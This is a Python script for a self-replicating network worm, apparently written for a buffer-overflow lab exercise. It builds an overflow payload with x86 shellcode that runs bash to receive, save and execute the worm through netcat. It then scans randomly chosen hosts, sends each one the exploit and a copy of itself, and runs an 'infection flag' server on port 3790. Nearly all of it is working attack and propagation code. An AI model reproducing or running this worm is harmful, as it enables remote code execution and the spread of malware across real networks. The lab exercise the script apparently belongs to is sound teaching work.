#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint
import socket
import threading
import time

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD"
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                   "
   " nc -lnv 8080 > /tmp/worm.py; chmod +x /tmp/worm.py;        "
   " /tmp/worm.py &                                             "
   "                                                           *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   frame_pointer = 0xffffd5e8
   buffer_address = 0xffffd578

   ret    = buffer_address + 0xA0
   offset = frame_pointer - buffer_address + 4

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)
def TCPServer():
    """
        This TCPServer flags or marks a server when it is
        infected with the worm.
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 3790)) # Bind to all interfaces on port 3790
    server_socket.listen(1)
    print("Infection flag server running on port 3790", flush=True)

    while True:
        client_conn, client_address = server_socket.accept()
        try:
            flag = client_conn.recv(1024)
            if flag == b"Are you infected":
                client_conn.sendall(b'I am infected!')
        except:
            pass
        finally:
            client_conn.close()

def checkIfInfected(targetIP):
    """
        Check if target is infected connecting to flag server on 3790
    """
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.settimeout(2)

    try:
        client_socket.connect((targetIP, 3790))
        client_socket.sendall(b"Are you infected")
        response = client_socket.recv(1024)

        if response == "I am infected!":
            return True      #infected
    except:
        pass
    finally:
        client_socket.close()

    return False

def isAlreadyRunning():
    """Check if worm is already running on this host"""
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_socket.bind(('0.0.0.0', 3790))
        client_socket.close()
        return False
    except:
        return True
if isAlreadyRunning():
    print(f"Worm is already running on this host, exiting...", flush=True)
    sys.exit(0)
###############################################################

print("The worm has arrived on this host ^_^", flush=True)
# Start the TCP server in the background thread
threading.Thread(target=TCPServer, daemon=True).start()
time.sleep(1)

# This is for visualization. It sends an ICMP echo message to
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile
createBadfile()

# Launch the attack on other servers
while True:
    netID = randint(151, 153)
    subnetID = randint(71, 75)
    targetIP = f"10.{netID}.0.{subnetID}"

    # Check if target is infected

    if checkIfInfected(targetIP):
        print(f"{targetIP} is already infected, skipping...", flush=True)
        continue

    # check if host is alive. Skip target if not alive
    try:
        output = subprocess.check_output(f"ping -q -c1 -W1 {targetIP}", shell=True)
        if b'1 received' not in output:
            continue
    except:
        continue

        # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w2 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(2)

    # Send the worm file to the victim (client sends file to server)
    print(f">>>>> Sending worm.py to {targetIP} <<<<<", flush=True)
    subprocess.run([f"cat /tmp/worm.py | nc -w5 {targetIP} 8080"], shell=True)

    # Sleep for 10 seconds before attacking another host
    time.sleep(1)

    # Remove this line if you want to continue attacking others
    # exit(0)



